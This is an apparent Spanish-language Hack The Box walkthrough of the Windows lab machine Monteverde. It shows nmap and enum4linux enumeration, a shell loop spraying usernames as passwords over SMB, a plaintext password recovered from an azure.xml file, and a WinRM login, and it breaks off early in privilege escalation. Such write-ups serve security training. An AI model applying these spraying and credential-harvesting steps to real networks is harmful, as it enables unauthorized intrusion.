<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Hack The Box - Monteverde [Active] :: sckull — TryHackMe, HackTheBox, CTF Writeups</title>    
  
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">

<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.  
Javascript needs to be enabled to decrypt content       Nombre Monteverde     OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.172   Maker egre55    NMAP Escaneo de puertos tcp/udp y servicios con nmap.
# Nmap 7."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://sckull.github.io/posts/monteverde/" />


<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">


<link rel="stylesheet" href="https://sckull.github.io/style.css">


<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Hack The Box - Monteverde [Active] :: sckull — TryHackMe, HackTheBox, CTF Writeups" />
<meta name="twitter:description" content="Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.  
Javascript needs to be enabled to decrypt content       Nombre Monteverde     OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.172   Maker egre55    NMAP Escaneo de puertos tcp/udp y servicios con nmap.
# Nmap 7." />
<meta name="twitter:site" content="https://sckull.github.io/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="https://sckull.github.io/image/htb/monteverde/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Hack The Box - Monteverde [Active] :: sckull — TryHackMe, HackTheBox, CTF Writeups">
<meta property="og:description" content="Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.  
Javascript needs to be enabled to decrypt content       Nombre Monteverde     OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.172   Maker egre55    NMAP Escaneo de puertos tcp/udp y servicios con nmap.
# Nmap 7." />
<meta property="og:url" content="https://sckull.github.io/posts/monteverde/" />
<meta property="og:site_name" content="Hack The Box - Monteverde [Active]" />
<meta property="og:image" content="https://sckull.github.io/image/htb/monteverde/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https://sckull.github.io/"
        },
        "articleSection" : "posts",
        "name" : "Hack The Box - Monteverde [Active]",
        "headline" : "Hack The Box - Monteverde [Active]",
        "description" : "Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.  
Javascript needs to be enabled to decrypt content       Nombre Monteverde     OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.172   Maker egre55    NMAP Escaneo de puertos tcp/udp y servicios con nmap.
# Nmap 7.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2020",
        "datePublished": "2020-01-26 00:00:00 &#43;0000 UTC",
        "dateModified" : "2020-01-26 00:00:00 &#43;0000 UTC",
        "url" : "https://sckull.github.io/posts/monteverde/",
        "wordCount" : "2725",
        "keywords" : [ "hackthebox","windows","writeup","walkthrough","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2020-01-26 00:00:00 &#43;0000 UTC" />




<a name="top"></a>
</head>

<body class="dark-theme">
  
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">Hack The Box - Monteverde [Active]</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Sunday, Jan 26, 2020
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
        <span class="post-read-time">— 13 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="https://sckull.github.io/tags/hackthebox/"><li class="fa fa-tag"></li> hackthebox</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/windows/"><li class="fa fa-tag"></li> windows</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/writeup/"><li class="fa fa-tag"></li> writeup</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/walkthrough/"><li class="fa fa-tag"></li> walkthrough</a>&nbsp;
        
      </span>
    

    
      
        <img src="https://sckull.github.io/posts/monteverde/../../image/htb/monteverde/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      
    </div>

    <div class="post-content">      
      <ul>
<li><em>Contenido protegido por contraseña.</em></li>
<li><em>Para desbloquear el contenido debes Ingresar la flag <code>root.txt</code> de la maquina.</em>

<hugo-encrypt>
	
	<div id="hugo-encrypt-encryption-notice">
		<p></p>
		<noscript><span id="hugo-encrypt-enable-js">Javascript needs to be enabled to decrypt content</span></noscript>

		<div class='hugo-encrypt-form'>
			<input
				class="hugo-encrypt-input"
				id="hugo-encrypt-password"
				placeholder=''
			/>
			<input
				class="button"
				type="button"
				value='Enviar '
				id="button" onclick="hugoDecrypt(document.getElementById('hugo-encrypt-password').value,'input')"
			/>
			<div id="hugo-encrypt-input-response"></div>
		</div>
	</div>
	<cipher-text data-password='12909612d25c8dcf6e5a07d1a804a0bc' style="display:none;">
		<table>
<thead>
<tr>
<th>Nombre</th>
<th>Monteverde</th>
</tr>
</thead>

<tbody>
<tr>
<td>OS</td>
<td>Windows</td>
</tr>

<tr>
<td>Puntos</td>
<td>30</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Media</td>
</tr>

<tr>
<td>IP</td>
<td>10.10.10.172</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://www.hackthebox.eu/home/users/profile/1190">egre55</a></td>
</tr>
</tbody>
</table>

<h2 id="nmap">NMAP</h2>

<p>Escaneo de puertos tcp/udp y servicios con nmap.</p>

<pre><code class="language-bash"># Nmap 7.80 scan initiated Sat Jan 18 18:57:43 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.172
Nmap scan report for 10.10.10.172
Host is up (0.26s latency).
Not shown: 65517 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-19 01:11:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49775/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=1/18%Time=5E23AA58%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03&quot;);
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 10m36s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-01-19T01:14:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 18 19:05:11 2020 -- 1 IP address (1 host up) scanned in 448.85 seconds
</code></pre>

<h2 id="enum4linux">ENUM4LINUX</h2>

<p>Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.</p>

<pre><code class="language-bash">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jan 18 19:15:47 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.172
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.172    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.172    |
 ============================================ 
Looking up status of 10.10.10.172
No reply from 10.10.10.172

 ===================================== 
|    Session Check on 10.10.10.172    |
 ===================================== 
[+] Server 10.10.10.172 allows sessions using username '', password ''
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.10.172    |
 =========================================== 
Domain Name: MEGABANK
Domain Sid: S-1-5-21-391775091-850290835-3566037492
[+] Host is part of a domain (not a workgroup)

 ====================================== 
|    OS information on 10.10.10.172    |
 ====================================== 
[+] Got OS info for 10.10.10.172 from smbclient: 
[+] Got OS info for 10.10.10.172 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.10.172    |
 ============================= 
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)

user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

 ========================================= 
|    Share Enumeration on 10.10.10.172    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.10.172

 ==================================================== 
|    Password Policy Information for 10.10.10.172    |
 ==================================================== 


[+] Attaching to 10.10.10.172 using a NULL share

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] MEGABANK
	[+] Builtin

[+] Password Info for Domain: MEGABANK

	[+] Minimum password length: 7
	[+] Password history length: 24
	[+] Maximum password age: 41 days 23 hours 53 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: 1 day 4 minutes 
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: Not Set


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 7


 ============================== 
|    Groups on 10.10.10.172    |
 ============================== 

[+] Getting builtin groups:
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+] Getting builtin group memberships:
Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs
Group 'Incoming Forest Trust Builders' (RID: 557) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Group 'Users' (RID: 545) has member: Couldn't lookup SIDs

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]
group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
group:[ADSyncAdmins] rid:[0x451]
group:[ADSyncOperators] rid:[0x452]
group:[ADSyncBrowse] rid:[0x453]
group:[ADSyncPasswordSet] rid:[0x454]

[+] Getting local group memberships:
Group 'ADSyncAdmins' (RID: 1105) has member: Couldn't lookup SIDs
Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]

[+] Getting domain group memberships:
Group 'HelpDesk' (RID: 2611) has member: MEGABANK\roleary
Group 'Trading' (RID: 2610) has member: MEGABANK\dgalanos
Group 'Operations' (RID: 2609) has member: MEGABANK\smorgan
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
Group 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group 'Domain Users' (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
Group 'Domain Users' (RID: 513) has member: MEGABANK\mhope
Group 'Domain Users' (RID: 513) has member: MEGABANK\SABatchJobs
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-ata
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-bexec
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-netapp
Group 'Domain Users' (RID: 513) has member: MEGABANK\dgalanos
Group 'Domain Users' (RID: 513) has member: MEGABANK\roleary
Group 'Domain Users' (RID: 513) has member: MEGABANK\smorgan
Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator

 ======================================================================= 
|    Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 ============================================= 
|    Getting printer info for 10.10.10.172    |
 ============================================= 
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
enum4linux complete on Sat Jan 18 19:19:29 2020
</code></pre>

<p>Vemos varios usuarios de los cuales no logramos obtener informacion que nos pudiesen ayudar a entrar en la maquina.</p>

<h2 id="smbmap">SMBMAP</h2>

<p>Utilizamos la lista de usuarios junto con smbmap para verificar que alguno de ellos tenga permisos en alguno de los SHARENAMEs de la maquina utilizando el nombre de usuario como contraseña.</p>

<pre><code class="language-bash">root@aoiri:~/htb/monteverde# while read USER; do echo $USER &amp;&amp; smbmap -H 10.10.10.172 -u $USER -p &quot;$USER&quot;; done &lt; users.txt
roleary
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.172
[!] Authentication error on 10.10.10.172
dgalanos
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.172
[!] Authentication error on 10.10.10.172
smorgan
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.172
[!] Authentication error on 10.10.10.172
AAD_987d7f2f57d2
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.172
[!] Authentication error on 10.10.10.172
mhope
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.172
[!] Authentication error on 10.10.10.172
Guest
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.172
[!] Authentication error on 10.10.10.172
SABatchJobs
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.172...
[+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	.                                                  
	dr--r--r--                0 Fri Jan  3 06:43:36 2020	.
	dr--r--r--                0 Fri Jan  3 06:43:36 2020	..
	azure_uploads                                     	READ ONLY	
	C$                                                	NO ACCESS	Default share
	E$                                                	NO ACCESS	Default share
	.                                                  
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	InitShutdown
	fr--r--r--                4 Sun Dec 31 17:57:56 1600	lsass
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	ntsvcs
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	scerpc
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-3b4-0
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	epmapper
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-1ec-0
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	LSM_API_service
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	eventlog
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-488-0
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	atsvc
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-6a4-0
	fr--r--r--                4 Sun Dec 31 17:57:56 1600	wkssvc
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-294-0
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-294-1
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	RpcProxy\49669
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	eddf3645116af5dd
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	RpcProxy\593
	fr--r--r--                4 Sun Dec 31 17:57:56 1600	srvsvc
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	spoolss
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-b54-0
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	netdfs
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	vgauth-service
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-280-0
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	W32TIME_ALT
	fr--r--r--                3 Sun Dec 31 17:57:56 1600	SQLLocal\MSSQLSERVER
	fr--r--r--                2 Sun Dec 31 17:57:56 1600	sql\query
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-ba0-0
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	CPFATP_6024_v4.0.30319
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	PSHost.132240333070920024.6024.DefaultAppDomain.miiserver
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	GoogleCrashServices\S-1-5-18
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	GoogleCrashServices\S-1-5-18-x64
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	Winsock2\CatalogChangeListener-bac-0
	fr--r--r--                1 Sun Dec 31 17:57:56 1600	PSHost.132240367071490977.1628.DefaultAppDomain.wsmprovhost
	IPC$                                              	READ ONLY	Remote IPC
	.                                                  
	dr--r--r--                0 Thu Jan  2 16:05:27 2020	.
	dr--r--r--                0 Thu Jan  2 16:05:27 2020	..
	NETLOGON                                          	READ ONLY	Logon server share 
	.                                                  
	dr--r--r--                0 Thu Jan  2 16:05:27 2020	.
	dr--r--r--                0 Thu Jan  2 16:05:27 2020	..
	dr--r--r--                0 Thu Jan  2 16:05:27 2020	MEGABANK.LOCAL
	SYSVOL                                            	READ ONLY	Logon server share 
	.                                                  
	dr--r--r--                0 Fri Jan  3 07:12:48 2020	.
	dr--r--r--                0 Fri Jan  3 07:12:48 2020	..
	dr--r--r--                0 Fri Jan  3 07:15:23 2020	dgalanos
	dr--r--r--                0 Fri Jan  3 07:41:18 2020	mhope
	dr--r--r--                0 Fri Jan  3 07:14:56 2020	roleary
	dr--r--r--                0 Fri Jan  3 07:14:28 2020	smorgan
	users$                                            	READ ONLY	
svc-ata
[+] Finding open SMB ports....
svc-bexec
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.172
[!] Authentication error on 10.10.10.172
</code></pre>

<p>Vemos que el usuario SABatchJobs tiene permisos de Lectura en <strong>azure_uploads</strong> y <strong>users$</strong>.</p>

<h2 id="user-mhope-azure-psadpasswordcredential">USER mhope - Azure PSADPasswordCredential</h2>

<p>Utilizamos las credenciales para enumerar <code>users$</code> con smbclient, encontramos un archivo de azure que contiene la contraseña en texto plano en un archivo de XML.</p>

<pre><code>root@aoiri:~/htb/monteverde# smbclient \\\\10.10.10.172\\users$ -U SABatchJobs
Enter WORKGROUP\SABatchJobs's password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Fri Jan  3 07:12:48 2020
  ..                                  D        0  Fri Jan  3 07:12:48 2020
  dgalanos                            D        0  Fri Jan  3 07:12:30 2020
  mhope                               D        0  Fri Jan  3 07:41:18 2020
  roleary                             D        0  Fri Jan  3 07:10:30 2020
  smorgan                             D        0  Fri Jan  3 07:10:24 2020

		524031 blocks of size 4096. 519955 blocks available
smb: \&gt; cd mhope
smb: \mhope\&gt; dir
  .                                   D        0  Fri Jan  3 07:41:18 2020
  ..                                  D        0  Fri Jan  3 07:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 07:40:23 2020

		524031 blocks of size 4096. 519955 blocks available
smb: \mhope\&gt; get azure.xml 
getting file \mhope\azure.xml of size 1212 as azure.xml (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \mhope\&gt; exit
root@aoiri:~/htb/monteverde# cat azure.xml 
��&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;
  &lt;Obj RefId=&quot;0&quot;&gt;
    &lt;TN RefId=&quot;0&quot;&gt;
      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;
      &lt;T&gt;System.Object&lt;/T&gt;
    &lt;/TN&gt;
    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;
    &lt;Props&gt;
      &lt;DT N=&quot;StartDate&quot;&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
      &lt;DT N=&quot;EndDate&quot;&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
      &lt;G N=&quot;KeyId&quot;&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;
      &lt;S N=&quot;Password&quot;&gt;4n0therD4y@n0th3r$&lt;/S&gt;
    &lt;/Props&gt;
  &lt;/Obj&gt;
&lt;/Objs&gt;
</code></pre>

<pre><code>Credenciales:
mhope:4n0therD4y@n0th3r$
</code></pre>

<h3 id="evilwinrm">EvilWinRm</h3>

<p>Ya que el puerto de winrm esta abierto utilizamos las credenciales que tenemos junto con evilwinrm, obtenemos una shell y nuestra flag <strong>user.txt</strong>.</p>

<p><img src="../../image/htb/monteverde/Screenshot_20200120_182009.png" alt="image" /></p>

<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>

<p>Utilizamos <code>whoami /all</code> para ver los permisos, grupos y privilegios que el usuario tiene.</p>

<pre><code class="language-shell">*Evil-WinRM* PS C:\Users\mhope\Documents&gt; whoami /all

USER INFORMATION
----------------

User Name      SID                                         
============== ============================================
megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes                                        
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448                                                                                    

